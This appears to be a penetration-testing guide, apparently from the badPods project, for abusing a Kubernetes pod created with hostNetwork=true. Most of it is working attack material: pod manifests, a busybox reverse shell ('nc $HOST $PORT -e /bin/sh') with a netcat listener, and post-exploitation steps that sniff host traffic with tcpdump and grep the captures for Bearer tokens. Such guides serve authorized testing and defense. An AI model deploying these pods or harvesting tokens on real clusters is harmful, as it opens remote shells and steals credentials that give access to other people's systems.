## You can create a pod with only hostNetwork

If you only have `hostNetwork=true`, you can't get RCE on the host directly, but if your cross your fingers you might still find a path to cluster admin. 
The important things here are: 
* You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
* You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostnetwork
  labels:
    app: pentest
spec:
  hostNetwork: true
  containers:
  - image: ubuntu
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    name: hostnetwork
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
[pod-hostnetwork.yaml](pod-hostnetwork.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostnetwork.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork/pod-hostnetwork.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostnetwork -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostnetwork-revshell
  labels:
    app: pentest
spec:
  hostNetwork: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    name: hostnetwork-revshell
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
[pod-hostnetwork-revshell.yaml](pod-hostnetwork-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" 
envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post Exploitation 

#### Install tcpdump and sniff traffic 
**Note:** If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes `tcpdump`, like https://hub.docker.com/r/corfr/tcpdump

```bash
apt update && apt install tcpdump 
```
You now have a few options for next steps: 

See if the `kubelet` read port (10255/tcp) is open on any of the node's IPs
```bash
nc -zv 10.0.0.162 10255
Connection to 10.0.0.162 10255 port [tcp/*] succeeded!
nc -zv 172.17.0.1 10255
Connection to 172.17.0.1 10255 port [tcp/*] succeeded!
```

If the read port is open, run `tcpdump`, recording the output to a file for a few minutes.

**Warning:** Sniffing on an interface with a lot of traffic can cause the interface to DROP traffic, which is not what you want in an production environment. I suggest picking one port at a time for your packet captures (e.g., 10255, 80, 8080, 3000 25, 23)
**Warning:** Always run `tcpdump` with the `-n` flag. This turns off name resolution, and if you don't, the name resolution will bring the capture, and potentially the host, to its knees. 

```bash
tcpdump -ni [host or docker interface name] -s0 -w kubelet-ro.cap port 10255
```
Stop the capture and read the file with `tcpdump`.  Tip: Use the `-A` flag to only show the printable characters and hunt for things like tokens with `grep`. 

```bash
tcpdump -ro kubelet-ro.cap -s0 -A
tcpdump -ro kubelet-ro.cap -s0 -A | grep Bearer
```

Cross your fingers and look for secrets.  If you are lucky, you might even get a jwt token. If you are really lucky, that token might be associated with a service account in `kube-system`.


# Another path: Investigate local services
```bash
curl https://localhost:1234/metrics
```

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.
